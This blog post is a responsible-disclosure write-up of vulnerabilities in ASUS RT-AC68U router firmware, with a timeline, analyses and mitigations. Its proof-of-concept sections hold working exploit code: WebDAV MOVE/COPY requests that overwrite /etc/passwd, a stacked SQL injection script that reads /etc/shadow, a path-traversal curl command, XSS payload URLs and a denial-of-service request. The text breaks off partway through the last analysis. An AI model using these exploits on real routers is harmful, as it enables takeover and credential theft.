<!doctype html><html lang=en><title>ASUS RT-AC68U RCE</title><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Cutive+Mono|Montserrat&amp;display=swap"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=alternate type=application/rss+xml title=RSS href=/feed.xml><meta name=viewport content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1"><meta property=og:locale content=en_US><meta property=og:type content=website><meta property=og:site_name content=robertchen.cc><script async src="https://www.googletagmanager.com/gtag/js?id=G-GD08C36681"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-GD08C36681")</script><meta name=twitter:card content=summary><meta name=twitter:creator content=@NotDeGhost><meta name=twitter:image content=https://robertchen.cc/ghost.png><meta name=og:title content="ASUS RT-AC68U RCE"><meta name=og:image content=https://robertchen.cc/ghost.png><meta name=og:description content=""><link rel=stylesheet href=/styles/github-markdown.css><link rel=stylesheet href=/styles/blog.css><link rel=stylesheet href=/highlight.css><div class=wrapper><script src=/scripts/sidebar.js></script><div class=sidebar><div><div class=sidebar--title><a href=/blog>rob</a></div><div class="sidebar--title sidebar--title__second"><a href=/blog>blog</a></div></div><div class=toc--padding></div><div class=toc--section><div class=toc--title><a class=unclickable href=""></a></div><div class=toc--section><div class=toc--title><a class=#thoughts href=#thoughts>thoughts</a></div></div><div class=toc--seperator></div><div class=toc--section><div class=toc--title><a class=#timeline href=#timeline>timeline</a></div></div><div class=toc--seperator></div><div class=toc--section><div class=toc--title><a class=#writeup href=#writeup>writeup</a></div></div><div class=toc--seperator></div><div class=toc--section><div class=toc--title><a class=#vulnerabilities href=#vulnerabilities>vulnerabilities</a></div><div class=toc--section><div class=toc--title><a class=#move%2Fcopy-priming href=#move%2Fcopy-priming>move/copy-priming</a></div><div class=toc--section><div class=toc--title><a class=#poc href=#poc>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis href=#analysis>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation href=#mitigation>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#move%2Fcopy-clobbering href=#move%2Fcopy-clobbering>move/copy-clobbering</a></div><div class=toc--section><div class=toc--title><a class=#poc-1 href=#poc-1>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-1 href=#analysis-1>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-1 href=#mitigation-1>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#move%2Fcopy-off-by-slash href=#move%2Fcopy-off-by-slash>move/copy-off-by-slash</a></div><div class=toc--section><div class=toc--title><a class=#poc-2 href=#poc-2>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-2 href=#analysis-2>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-2 href=#mitigation-2>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#propfindmedialist-sql-injection href=#propfindmedialist-sql-injection>propfindmedialist-sql-injection</a></div><div class=toc--section><div class=toc--title><a class=#poc-3 href=#poc-3>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-3 href=#analysis-3>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-3 href=#mitigation-3>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#share-link-file-traversal href=#share-link-file-traversal>share-link-file-traversal</a></div><div class=toc--section><div class=toc--title><a class=#poc-4 href=#poc-4>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-4 href=#analysis-4>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-4 href=#mitigation-4>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#picasa.html-xss href=#picasa.html-xss>picasa.html-xss</a></div><div class=toc--section><div class=toc--title><a class=#poc-5 href=#poc-5>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-5 href=#analysis-5>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-5 href=#mitigation-5>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#urlinfo-xss href=#urlinfo-xss>urlinfo-xss</a></div><div class=toc--section><div class=toc--title><a class=#poc-6 href=#poc-6>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-6 href=#analysis-6>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-6 href=#mitigation-6>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#openurl-xss href=#openurl-xss>openurl-xss</a></div><div class=toc--section><div class=toc--title><a class=#poc-7 href=#poc-7>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-7 href=#analysis-7>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-7 href=#mitigation-7>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#ainvite-post-handler-dos href=#ainvite-post-handler-dos>ainvite-post-handler-dos</a></div><div class=toc--section><div class=toc--title><a class=#poc-8 href=#poc-8>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-8 href=#analysis-8>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-8 href=#mitigation-8>mitigation</a></div></div></div><div class=toc--section><div class=toc--title><a class=#%2Fainvit-dos href=#%2Fainvit-dos>/ainvit-dos</a></div><div class=toc--section><div class=toc--title><a class=#poc-9 href=#poc-9>poc</a></div></div><div class=toc--section><div class=toc--title><a class=#analysis-9 href=#analysis-9>analysis</a></div></div><div class=toc--section><div class=toc--title><a class=#mitigation-9 href=#mitigation-9>mitigation</a></div></div></div></div><div class=toc--seperator></div></div><div class=sidebar--expander></div><a class=sidebar--link href=/ >robertchen.cc</a> <a class=sidebar--link href=https://twitter.com/NotDeGhost>twitter</a><div class=sidebar--text>cybersecurity &amp; competitive programming</div></div><div class=mobile-sidebar-ico><picture><source srcset=/favicon-32x32.webp type=image/webp><source srcset=/favicon-32x32.png><img src=/favicon-32x32.png></picture></div><div class=content-wrapper><div class="content markdown-body"><h1>ASUS RT-AC68U RCE</h1><p>Over the summer of my junior year, I decided to do some router pentesting. Embedded security always seemed very fun to me. I liked the idea of breaking things that are found in our everyday lives, and what better place to start than my router. I was also inspired by my friend <a href=https://twitter.com/arinerron>@arinerron</a> who had some success with his router previously.<p>I dumped the firmware and started analyzing the binaries in Ghidra. I also found a <a href=https://github.com/RMerl/asuswrt-merlin.ng/tree/master>GitHub repository</a> containing a modified version of the source which greatly helped with the reversing process.<h3 id=thoughts tabindex=-1><a class=header-anchor href=#thoughts aria-hidden=true><span aria-hidden=true>##</span></a> Thoughts</h3><p>In the end, I managed to find a pre-auth arbitrary file read vulnerability, which could be used to dump <code>/etc/shadow</code>. From here, this could be chained with an authenticated arbitrary file write vulnerability to achieve code execution.<p>A shodan search suggests that around 200 thousand routers online could be potentially vulnerable, although because some specialized configuration is required the actual number is probably a bit lower.<p>One thing I found interesting was how many of the vulnerabilities involved “off-by-slash” issues. For example, requests to <code>/smb/*</code> required authentication but not <code>/smb</code>. If anything, this shows the importance of paying attention to the details when performing code audits.<p>It was also cool how there was an exploitable SQL injection vulnerability in such a seemingly low-level target.<p>Even though the code quality wasn’t the highest - many of these vulnerabilities were not very well hidden - this was overall a pretty fun exercise in code-review.<h3 id=timeline tabindex=-1><a class=header-anchor href=#timeline aria-hidden=true><span aria-hidden=true>##</span></a> Timeline</h3><p>08/18/2020 - Vulnerability submitted to <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f18294928483988588b190828482df929e9c">[email&#160;protected]</a></code><br>08/18/2020 - Vendor response<br>10/25/2020 - Beta firmware - official release “in one month”<br>12/19/2020 - Additional correspondence<br>01/18/2021 - <code>3.0.0.4.386.41634</code> released<h2 id=writeup tabindex=-1><a class=header-anchor href=#writeup aria-hidden=true><span aria-hidden=true>#</span></a> Writeup</h2><p><em>This is an adapted version of the writeup that was sent to the ASUS security team.</em><p>This document summarizes the results of my pentesting against ASUS RT-AC68U on the latest firmware version <code>3.0.0.4.385_20632</code>. These vulnerabilities range from simple denial of service, to a no-interaction unauthenticated remote code execution chain. Many of these likely apply to other similar router versions as well. I also discuss several solutions for remediation.<p>These were patched in version <code>3.0.0.4.386.41634</code>.<p>Overall, I present the following vulnerabilities:<ol><li>No-interaction pre-authentication RCE chain<li>No-interaction pre-authentication persistent DOS chain<li>3 XSS vectors, two of which could chain to RCE<li>2 temporary denial of service exploits</ol><h2 id=vulnerabilities tabindex=-1><a class=header-anchor href=#vulnerabilities aria-hidden=true><span aria-hidden=true>#</span></a> Vulnerabilities</h2><p>Note that you will need to enable the lighttpd server by going to <a href=http://router.asus.com/cloud_main.asp>http://router.asus.com/cloud_main.asp</a> and enabling Cloud Disk.<p>Additionally, some of the exploits require the mounting of an external device.<h3 id=move%2Fcopy-priming tabindex=-1><a class=header-anchor href=#move%2Fcopy-priming aria-hidden=true><span aria-hidden=true>##</span></a> MOVE/COPY Priming</h3><p>No authentication file-write to <code>/mnt/*</code>. An attacker chain this with <code>MOVE/COPY Off By Slash</code> to remotely brick a router, for example, by overwriting <code>/etc/shadow</code> or other important configuration files.<h4 id=poc tabindex=-1><a class=header-anchor href=#poc aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>There are two relevant primitives - file creation and directory creation.<pre><code class=language-javascript>fetch(<span class=hljs-string>"/smb/js/jplayer"</span>, {
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"destination"</span>: <span class=hljs-string>"https://domain.tld/RT-AC68U/customdir"</span>,
    <span class=hljs-string>"overwrite"</span>: <span class=hljs-string>"T"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>""</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"MOVE"</span>
});
</code></pre><p><em>directory creation</em><pre><code class=language-javascript>fetch(<span class=hljs-string>"/smb/control"</span>, {
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"destination"</span>: <span class=hljs-string>"https://domain.tld/RT-AC68U/customdir/testfile"</span>,
    <span class=hljs-string>"overwrite"</span>: <span class=hljs-string>"T"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>""</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"MOVE"</span>
});
</code></pre><p><em>file creation</em><p>This allows an attacker to overwrite arbitrary contents under <code>/mnt</code>. Note that an attacker is able to create any file structure they desire with these primitives. However, while the file layout is attacker controlled, the content within the files is not.<h4 id=analysis tabindex=-1><a class=header-anchor href=#analysis aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>Improper sanitation on the source for COPY and MOVE operations allows an attacker to load preexisting files from the router, even without authentication.<h4 id=mitigation tabindex=-1><a class=header-anchor href=#mitigation aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Ensure that <code>con-&gt;physical.path</code> starts with <code>/mnt</code> in the <code>mod_webdav.so</code> for <code>HTTP_METHOD_MOVE</code> and <code>HTTP_METHOD_COPY</code>.</ol><h3 id=move%2Fcopy-clobbering tabindex=-1><a class=header-anchor href=#move%2Fcopy-clobbering aria-hidden=true><span aria-hidden=true>##</span></a> MOVE/COPY Clobbering</h3><p>Authenticated arbitrary file write to <code>/*</code>. Can escalate to RCE by overwriting executable files, for example <code>/etc/zcip</code>. Can also modify internal variables such as the router password by writing to <code>/dev/nvram</code>.<h4 id=poc-1 tabindex=-1><a class=header-anchor href=#poc-1 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Create a directory structure as such.<pre><code>/mnt
  /USB-NAME
    /path
      /etc
        passwd
</code></pre><p>Run the below JavaScript.<pre><code class=language-javascript>fetch(<span class=hljs-string>"/RT-AC68U/USB-NAME/path"</span>, { 
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"overwrite"</span>: <span class=hljs-string>"T"</span>,
    <span class=hljs-string>"destination"</span>: <span class=hljs-string>"https://domain.tld/"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>""</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"COPY"</span>,
});
</code></pre><p>This will overwrite <code>/etc/passwd</code>.<h4 id=analysis-1 tabindex=-1><a class=header-anchor href=#analysis-1 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>Improper sanitation on the target for COPY and MOVE operations gives an attacker an arbitrary file-write primitive.<h4 id=mitigation-1 tabindex=-1><a class=header-anchor href=#mitigation-1 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Ensure that <code>p-&gt;physical.path</code> starts with <code>/mnt</code> in the <code>mod_webdav.so</code> for <code>HTTP_METHOD_MOVE</code> and <code>HTTP_METHOD_COPY</code>.</ol><h3 id=move%2Fcopy-off-by-slash tabindex=-1><a class=header-anchor href=#move%2Fcopy-off-by-slash aria-hidden=true><span aria-hidden=true>##</span></a> MOVE/COPY Off By Slash</h3><p>No-authentication arbitrary file copying from <code>/mnt/*</code> to <code>/*</code>. Can combine with <code>MOVE/COPY Priming</code> to remotely brick a router, for example, by overwriting <code>/etc/shadow</code> or other important configuration files.<h4 id=poc-2 tabindex=-1><a class=header-anchor href=#poc-2 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Create a directory structure as such.<pre><code>/mnt
  /etc
    passwd
</code></pre><p>Run the below JavaScript.<pre><code class=language-javascript>fetch(<span class=hljs-string>"/RT-AC68U"</span>, { 
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"overwrite"</span>: <span class=hljs-string>"T"</span>,
    <span class=hljs-string>"destination"</span>: <span class=hljs-string>"https://domain.tld/"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>""</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"COPY"</span>,
});
</code></pre><h4 id=analysis-2 tabindex=-1><a class=header-anchor href=#analysis-2 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>The authentication handler has an off-by-slash error, matching for <code>/RT-AC68U/</code> instead of <code>/RT-AC68U</code>. Thus, it allows unauthenticated requests to <code>/RT-AC68U</code> to hit the endpoint (note that adding a slash results in a 401). This allows an attacker to perform a copy operation from <code>/mnt</code> to <code>/</code>, exploiting a similar vulnerability as in <code>MOVE/COPY Clobbering</code>. By creating a fake directory structure with <code>MOVE/COPY Priming</code>, these two vulnerabilities give an attacker a write-anywhere primitive.<h4 id=mitigation-2 tabindex=-1><a class=header-anchor href=#mitigation-2 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Ensure the authentication handler filters requests against <code>/RT-AC68U</code> instead of <code>/RT-AC68U/</code>.</ol><h3 id=propfindmedialist-sql-injection tabindex=-1><a class=header-anchor href=#propfindmedialist-sql-injection aria-hidden=true><span aria-hidden=true>##</span></a> PROPFINDMEDIALIST SQL Injection</h3><p>No user-interaction arbitrary file-read. By reading <code>/etc/shadow</code>, an unauthorized remote attacker can disclose a hashed password. Cracking this offline gives the router password. Can be combined with <code>MOVE/COPY Clobbering</code> for a full no-interaction RCE chain.<h4 id=poc-3 tabindex=-1><a class=header-anchor href=#poc-3 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>You will need to enable the Digital Media Server functionality.<p>Run the below javascript, for example in the dev console, while on the AiCloud page.<pre><code class=language-javascript>(<span class=hljs-keyword>async</span>() =&gt; {
<span class=hljs-keyword>var</span> author = <span class=hljs-string>""</span> + <span class=hljs-built_in>Math</span>.random();
<span class=hljs-keyword>var</span> path = <span class=hljs-string>"/etc/shadow"</span>;
<span class=hljs-keyword>var</span> dId = <span class=hljs-built_in>Math</span>.floor(<span class=hljs-number>100000</span> * <span class=hljs-built_in>Math</span>.random()) + <span class=hljs-number>10000</span>
<span class=hljs-keyword>var</span> oId = <span class=hljs-built_in>Math</span>.floor(<span class=hljs-number>100000</span> * <span class=hljs-built_in>Math</span>.random()) + <span class=hljs-number>10000</span>
<span class=hljs-keyword>var</span> pId = <span class=hljs-built_in>Math</span>.floor(<span class=hljs-number>100000</span> * <span class=hljs-built_in>Math</span>.random()) + <span class=hljs-number>10000</span>
<span class=hljs-keyword>var</span> val = (<span class=hljs-string>"a' OR 1 ); INSERT INTO DETAILS (TITLE, ALBUM_ART, ARTIST, ID) VALUES ('a', '"</span> + pId + <span class=hljs-string>"', '"</span> + author + <span class=hljs-string>"', "</span> + dId + <span class=hljs-string>"); -- "</span>).split(<span class=hljs-string>"'"</span>).join(<span class=hljs-string>"%27"</span>)
<span class=hljs-built_in>console</span>.log(val.length)

<span class=hljs-keyword>await</span> fetch(<span class=hljs-string>"/smb"</span>, {
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"keyword"</span>: val,
    <span class=hljs-string>"mediatype"</span>: <span class=hljs-string>"1"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;D:propfind xmlns:D=\"DAV:\"&gt;&lt;D:prop&gt;&lt;D:getlastmodified/&gt;&lt;D:getcontentlength/&gt;&lt;D:getcontenttype/&gt;&lt;D:getmatadata/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;"</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"PROPFINDMEDIALIST"</span>,
});

val = (<span class=hljs-string>"a' OR 1 ); INSERT INTO OBJECTS (PARENT_ID, OBJECT_ID, DETAIL_ID, CLASS) VALUES ('1$7', "</span> + oId + <span class=hljs-string>", "</span> + dId + <span class=hljs-string>", 'container.album.musicAlbum'); -- "</span>).split(<span class=hljs-string>"'"</span>).join(<span class=hljs-string>"%27"</span>)
<span class=hljs-built_in>console</span>.log(val.length)


<span class=hljs-keyword>await</span> fetch(<span class=hljs-string>"/smb"</span>, {
  <span class=hljs-string>"headers"</span>: {

    <span class=hljs-string>"keyword"</span>: val,
    <span class=hljs-string>"mediatype"</span>: <span class=hljs-string>"1"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;D:propfind xmlns:D=\"DAV:\"&gt;&lt;D:prop&gt;&lt;D:getlastmodified/&gt;&lt;D:getcontentlength/&gt;&lt;D:getcontenttype/&gt;&lt;D:getmatadata/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;"</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"PROPFINDMEDIALIST"</span>,
});

val = (<span class=hljs-string>"a' OR 1 );  INSERT INTO ALBUM_ART (PATH, ID) VALUES ('"</span> + path + <span class=hljs-string>"', "</span> + pId + <span class=hljs-string>"); -- "</span>).split(<span class=hljs-string>"'"</span>).join(<span class=hljs-string>"%27"</span>)
<span class=hljs-built_in>console</span>.log(val.length)


<span class=hljs-keyword>await</span> fetch(<span class=hljs-string>"/smb"</span>, {
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"keyword"</span>: val,
    <span class=hljs-string>"mediatype"</span>: <span class=hljs-string>"1"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;D:propfind xmlns:D=\"DAV:\"&gt;&lt;D:prop&gt;&lt;D:getlastmodified/&gt;&lt;D:getcontentlength/&gt;&lt;D:getcontenttype/&gt;&lt;D:getmatadata/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;"</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"PROPFINDMEDIALIST"</span>,
});

<span class=hljs-keyword>await</span> fetch(<span class=hljs-string>"/smb"</span>, {
  <span class=hljs-string>"headers"</span>: {
    <span class=hljs-string>"classify"</span>: <span class=hljs-string>"album"</span>,
  },
  <span class=hljs-string>"body"</span>: <span class=hljs-string>"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;D:propfind xmlns:D=\"DAV:\"&gt;&lt;D:prop&gt;&lt;D:getlastmodified/&gt;&lt;D:getcontentlength/&gt;&lt;D:getcontenttype/&gt;&lt;D:getmatadata/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;"</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"GETMUSICCLASSIFICATION"</span>
}).then(<span class=hljs-function><span class=hljs-params>a</span> =&gt;</span> a.text()).then(<span class=hljs-function><span class=hljs-params>b</span> =&gt;</span> {
<span class=hljs-keyword>var</span> aidx = b.indexOf(author)
<span class=hljs-keyword>var</span> pay = b.substring(b.indexOf(<span class=hljs-string>"&lt;thumb_image&gt;"</span>, aidx) + <span class=hljs-string>"&lt;thumb_image&gt;"</span>.length, b.indexOf(<span class=hljs-string>"&lt;/thumb_image&gt;"</span>, aidx))

<span class=hljs-built_in>console</span>.log(atob(pay))
})
})()
</code></pre><h4 id=analysis-3 tabindex=-1><a class=header-anchor href=#analysis-3 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><pre><code class=language-c>    <span class=hljs-comment>//- Avoid SQL injection!</span>
    <span class=hljs-keyword>if</span>( keyword!=<span class=hljs-literal>NULL</span> &amp;&amp; <span class=hljs-built_in>strstr</span>(keyword-&gt;ptr, <span class=hljs-string>"'"</span>)!=<span class=hljs-literal>NULL</span>) {      
      Cdbg(DBE, <span class=hljs-string>"keyword is invalid!"</span>);
      
    ...
    
    <span class=hljs-keyword>if</span>(!buffer_is_empty(keyword)){      
      buffer_urldecode_path(keyword);
</code></pre><p><em>mod_webdav.c</em><p>The check for SQL injection happens before the url decode. This allows an attacker to pass in a URL-encoded single quote, %27, bypassing any SQL injection mitigations. In addition, stacked queries are enabled allowing an attacker to easily chain statements. This can be used to create a fake album, which is ultimately triggered by the <code>GETMUSICCLASSIFICATION</code> method, passing a fake filepath to <code>get_album_cover_image</code>.<pre><code class=language-c>    <span class=hljs-keyword>char</span>* album_cover_file = result2[<span class=hljs-number>1</span>];
                  
    FILE* fp = fopen(album_cover_file, <span class=hljs-string>"rb"</span>);
</code></pre><p><em>mod_webdav.c</em><p>The contents of this file pointer are then read into a buffer, and then passed directly back to the attacker.<h4 id=mitigation-3 tabindex=-1><a class=header-anchor href=#mitigation-3 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Perform the SQL injection check after <code>bufer_urldecode_path</code>.<li>Sanity check on <code>album_cover_file</code>, for example <code>strncmp(album_cover_file, "/mnt", 4)</code></ol><h3 id=share-link-file-traversal tabindex=-1><a class=header-anchor href=#share-link-file-traversal aria-hidden=true><span aria-hidden=true>##</span></a> Share Link File Traversal</h3><p>Given a single valid share link, an attacker can disclose any other file.<h4 id=poc-4 tabindex=-1><a class=header-anchor href=#poc-4 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Create a file structure as shown (a single folder with files a.txt and b.txt).<pre><code>/mnt/XXX 
  a.txt
  b.txt
</code></pre><p>Create a sharelink for a.txt. Append <code>/%2e%2e/b.txt</code> to the sharelink.<p>Your final URL should look like <code>https://domain.tld/AICLOUDXXXXXXX/a.txt/%2e%2e/b.txt</code>. Curl the URL - <code>curl -k https://domain.tld/AICLOUDXXXXXXX/a.txt/%2e%2e/b.txt</code> - and note that b.txt gets downloaded.<h4 id=analysis-4 tabindex=-1><a class=header-anchor href=#analysis-4 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p><code>mod_aicloud_sharelink_parser</code> URL decodes the path, but fails to filter out path traversals like <code>/../</code> after decoding.<h4 id=mitigation-4 tabindex=-1><a class=header-anchor href=#mitigation-4 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Filter out <code>/../</code> from AICLOUD paths</ol><h3 id=picasa.html-xss tabindex=-1><a class=header-anchor href=#picasa.html-xss aria-hidden=true><span aria-hidden=true>##</span></a> picasa.html XSS</h3><p>With user-interaction account takeover - total file disclosure and chain with above to remote code execution.<h4 id=poc-5 tabindex=-1><a class=header-anchor href=#poc-5 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>While logged in, visit <code>/smb/css/service/picasa.html?v=%3C%2ftextarea%3E%3Cscript%3Ealert(%27XSS%27)%3C%2fscript%3E.jpg</code><h4 id=analysis-5 tabindex=-1><a class=header-anchor href=#analysis-5 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>The abbreviated JS is shown below.<pre><code class=language-javascript>  var uploadfile_url = getUrlVars()["v"];
  ...
  var this_filename = decodeURIComponent( uploadfile_url
    .substr( uploadfile_url.lastIndexOf("/") + 1, uploadfile_url.length-1 ) );
  ...
  upload_html += '&lt;textarea style="resize: none; width: 292px; height: 82px;" 
    autocomplete="off" id="title" name="title" class="x-form-textarea x-form-field 
    service_upload_field ' + className + '"&gt;' + this_filename + '&lt;/textarea&gt;';
</code></pre><p>Note that the value of the <code>v</code> parameter is reflected directly into the HTML (after decoding). A malicious filename like <code>&lt;/textarea&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code> allows an attacker to inject scripts. This could be done silently from an attacker controlled webpage, giving an attacker access to the router as long as the user is logged in.<h4 id=mitigation-5 tabindex=-1><a class=header-anchor href=#mitigation-5 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Sanitize the value of <code>this_filename</code> before injecting into the HTML, as shown below.</ol><pre><code class=language-javascript><span class=hljs-keyword>return</span> mystring.replace(<span class=hljs-regexp>/&amp;/g</span>, <span class=hljs-string>"&amp;amp;"</span>).replace(<span class=hljs-regexp>/&gt;/g</span>, <span class=hljs-string>"&amp;gt;"</span>).replace(<span class=hljs-regexp>/&lt;/g</span>, <span class=hljs-string>"&amp;lt;"</span>).replace(<span class=hljs-regexp>/"/g</span>, <span class=hljs-string>"&amp;quot;"</span>);
</code></pre><ol start=2><li>Exit on invalid characters in file name - blacklist <code>&lt;&gt;</code>.</ol><h3 id=urlinfo-xss tabindex=-1><a class=header-anchor href=#urlinfo-xss aria-hidden=true><span aria-hidden=true>##</span></a> urlInfo XSS</h3><p>Same impact scenario as <code>picasa.html XSS</code>.<h4 id=poc-6 tabindex=-1><a class=header-anchor href=#poc-6 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>While logged out, navigate to <code>/RT-AC68U/zz%27onmouseover=a.hidden=true;alert(origin)%20id=a%20style=width:100vw;position:fixed;top:0;height:100vh;opacity:0.01%20a=</code><h4 id=analysis-6 tabindex=-1><a class=header-anchor href=#analysis-6 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>The handler for urlInfo fails to escape single quotes.<pre><code class=language-c>          buffer_copy_string_len(out, CONST_STR_LEN(<span class=hljs-string>"&lt;input class='urlInfo' value='"</span>));        
          buffer_append_string_buffer(out, con-&gt;url.rel_path);        
          buffer_append_string_len(out, CONST_STR_LEN(<span class=hljs-string>"' type='hidden'&gt;"</span>));
</code></pre><p><em>connections.c</em><h4 id=mitigation-6 tabindex=-1><a class=header-anchor href=#mitigation-6 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Sanitize the urlInfo property. Escape single quotes, replacing them with the HTML entity <code>&amp;apos;</code></ol><h3 id=openurl-xss tabindex=-1><a class=header-anchor href=#openurl-xss aria-hidden=true><span aria-hidden=true>##</span></a> openurl XSS</h3><p>Same impact scenario as <code>picasa.html XSS</code>.<h4 id=poc-7 tabindex=-1><a class=header-anchor href=#poc-7 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Navigate to <code>/smb/..%2f'onload='alert(origin)</code> while logged in`.<h4 id=analysis-7 tabindex=-1><a class=header-anchor href=#analysis-7 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>This injects the <code>openurl</code> property on body. The final rendered HTML is as such.<pre><code class=language-html><span class=hljs-tag>&lt;<span class=hljs-name>body</span> <span class=hljs-attr>openurl</span>=<span class=hljs-string>'/smb/../'</span><span class=hljs-attr>onload</span>=<span class=hljs-string>'alert(origin)'</span> <span class=hljs-attr>fileview_only</span>=<span class=hljs-string>'1'</span>&gt;</span><span class=hljs-tag>&lt;/<span class=hljs-name>body</span>&gt;</span>
</code></pre><h4 id=mitigation-7 tabindex=-1><a class=header-anchor href=#mitigation-7 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Sanitize the openurl property. Escape single quotes, replacing them with the HTML entity <code>&amp;apos;</code></ol><h3 id=ainvite-post-handler-dos tabindex=-1><a class=header-anchor href=#ainvite-post-handler-dos aria-hidden=true><span aria-hidden=true>##</span></a> AINVITE POST Handler DOS</h3><p>No interaction/authentication denial of service.<h4 id=poc-8 tabindex=-1><a class=header-anchor href=#poc-8 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Run the below code in the developer console on the lighttpd webpage. This sends a POST request with body “junk” to <code>/AINVITE</code>.<pre><code class=language-javascript>fetch(<span class=hljs-string>"/AINVITE"</span>, {
  <span class=hljs-string>"body"</span>: <span class=hljs-string>"junk"</span>,
  <span class=hljs-string>"method"</span>: <span class=hljs-string>"POST"</span>
});
</code></pre><h4 id=analysis-8 tabindex=-1><a class=header-anchor href=#analysis-8 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>The handler for post data looks as such.<pre><code class=language-c>iVar1 = parse_postdata_from_chunkqueue(param_1,param_2,param_2-&gt;field_0x54,&amp;local_6c);
<span class=hljs-keyword>if</span> ((iVar1 == <span class=hljs-number>0</span>) &amp;&amp; (local_6c != (<span class=hljs-keyword>void</span> *)<span class=hljs-number>0x0</span>)) {
